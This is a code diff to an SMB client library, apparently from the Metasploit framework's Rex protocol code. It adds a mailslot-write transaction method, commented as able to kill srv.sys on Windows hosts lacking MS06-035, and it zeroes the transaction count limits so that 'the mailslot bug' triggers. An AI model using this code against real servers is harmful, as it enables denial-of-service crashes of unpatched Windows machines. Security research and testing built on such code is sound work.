@@ -799,7 +799,7 @@ EVADE = Rex::Proto::SMB::Evasions
 	
 	# Returns a SMB_CREATE_RES response for a given named pipe
 	def create_pipe(filename, disposition = 1, impersonation = 2)
-		self.create(EVADE.make_named_pipe_path(evasion_opts['pad_file'], filename))
+		self.create(filename)
 	end
 	
 	# Creates a file or opens an existing pipe
@@ -988,6 +988,16 @@ EVADE = Rex::Proto::SMB::Evasions
 		self.trans(pipe, '', data, 2, [0x26, file_id].pack('vv'), no_response)
 	end
 
+	# Perform a mailslot write over SMB
+	# Warning: This can kill srv.sys unless MS06-035 is applied
+	def trans_mailslot (name, data = '')
+		# Setup data must be:
+		#  Operation: 1 (write)
+		#   Priority: 0
+		#      Class: Reliable
+		self.trans(name, '', data, 3, [1, 0, 1].pack('vvv'), true )
+	end
+	
 	# Perform a transaction against a given pipe name
 	def trans(pipe, param = '', body = '', setup_count = 0, setup_data = '', no_response = nil)
 
@@ -1034,8 +1044,15 @@ EVADE = Rex::Proto::SMB::Evasions
 		
 		pkt['Payload'].v['ParamCountTotal'] = param.length
 		pkt['Payload'].v['DataCountTotal'] = body.length
-		pkt['Payload'].v['ParamCountMax'] = 1024
-		pkt['Payload'].v['DataCountMax'] = 65504
+		
+		# Are these needed?
+		# pkt['Payload'].v['ParamCountMax'] = 1024
+		# pkt['Payload'].v['DataCountMax'] = 65504
+		 
+		# Require for mailslot bug to trigger
+		pkt['Payload'].v['ParamCountMax'] = 0
+		pkt['Payload'].v['DataCountMax'] = 0
+			
 		pkt['Payload'].v['ParamCount'] = param.length
 		pkt['Payload'].v['ParamOffset'] = param_offset
 		pkt['Payload'].v['DataCount'] = body.length
@@ -1044,6 +1061,7 @@ EVADE = Rex::Proto::SMB::Evasions
 		pkt['Payload'].v['SetupData'] = setup_data
 					
 		pkt['Payload'].v['Payload'] = data
+		
 		if no_response
 			pkt['Payload'].v['Flags'] = 2
 		end
@@ -1133,6 +1151,7 @@ EVADE = Rex::Proto::SMB::Evasions
 		return ack
 	end
 
+	
 	def queryfs(level)
 		parm = [level].pack('v')
 
